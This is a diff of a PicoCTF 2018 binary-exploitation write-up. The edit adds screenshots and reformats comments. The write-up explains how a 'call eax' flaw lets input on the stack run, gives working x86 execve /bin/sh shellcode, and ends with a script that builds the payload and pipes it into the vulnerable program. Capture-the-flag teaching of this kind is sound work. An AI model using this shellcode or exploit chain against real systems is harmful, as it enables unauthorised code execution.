@@ -1,3 +1,4 @@
+# Write-up for shellcode challenge
 # PicoCTF_2018: shellcode
 
 **Category:** Binary Exploitation
@@ -54,11 +55,16 @@ Okay now let's get to some nice stuff.
 We need to understand how the vuln program works. For this purpose we will make use of gdb to disassemble the program and find what it does.
 This is how it looks like. (It may not be exactly the same in your case)
 
+![Screenshot from 2019-10-10 00-21-21](https://user-images.githubusercontent.com/37578272/66527168-c855b480-eb03-11e9-820d-131d4dcb2d31.png)
+
+![Screenshot from 2019-10-10 00-21-07](https://user-images.githubusercontent.com/37578272/66527193-df94a200-eb03-11e9-8671-4a4ab67761b0.png)
 
 Nice, we see that the compiled binary is 32bit.
 Inside the two functions (main and vuln) we need to focus on two points.
 In the vuln function we see gets being called (which is vulnerable because doesn't check the size of our input, so we can overflow the buffer, but we don't need it in this challenge, it's much easier), so binary waits for input from stdin. Moreover, in the main function we can see the vulnerability we will exploit. **<main + 124>: call eax**
 We want to find what it is inside register eax before we call it so we set a breakpoint before this instruction. Going down there we realize that in eax register is the address of the stack where our input is saved. So when program calls eax, tells processor to go to this address and execute the instructions that will find there. Thus we understand that if we put in the right input (a shellcode) we can easily gain access. And .... let's go write this shellcode anyway.
+
+![Screenshot from 2019-10-10 02-24-33](https://user-images.githubusercontent.com/37578272/66527509-2a62e980-eb05-11e9-976e-cd4c87757ff9.png)
 
 > # Crafting Shellcode
 I will try to explain it in brief. First create shellcode.asm with the following code:
@@ -73,16 +79,16 @@ push /bin in hex
 In 32 bit systems,  a memory block has a 4 bytes size, so we split our string. We also use 2 '//' so that we cover the whole block(4 bytes - '/sh' is 3 bytes), otherwise there will be something else in the 4th byte that we don't want to. /bin/sh and /bin//sh have no difference.
 
 ```asm
-xor eax, eax ; clearing eax register
-push eax     ; Pushing NULL bytes (\0)
-push 0x68732f2f ; Pushing //sh
+xor eax, eax     ; clearing eax register
+push eax         ; Pushing NULL bytes (\0)
+push 0x68732f2f  ; Pushing //sh
 push 0x6e69622f  ; Pushing /bin
 mov ebx, esp     ; ebx has address of /bin//sh
 push eax         ; Pushing NULL byte (for argv array)
 mov edx, esp     ; edx now has address of NULL byte
 push ebx         ; pushing address of /bin//sh
 mov ecx, esp     ; ecx now has address of address of /bin//sh 
-mov al, 0xb    ; syscall number of execve is 11
+mov al, 0xb      ; syscall number of execve is 11
 int 0x80         ; system call
 ```
 
@@ -146,6 +152,10 @@ cat flag.txt
 Congrats, we got our flag.
 Why can we now read flag.txt?
 Using *id* command we notice that user is the same as before, but now we belong to root group. (sgid you are so dangerous my friend). And flag.txt allow to members of root group to read the file. Genious...
+
+![Screenshot from 2019-10-10 02-19-42](https://user-images.githubusercontent.com/37578272/66527375-a4df3980-eb04-11e9-85a0-e0c600d83674.png)
+
+
 Before we get to 64bit systems let's write a shell script( I like doing that everytime, it's like a sum up)
 ```bash
 nasm -f elf shellcode.asm
@@ -154,9 +164,3 @@ python -c "print '`(for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do
 
 (cat payload; cat) | ./vuln
 ```
-
-
-
-
-
-
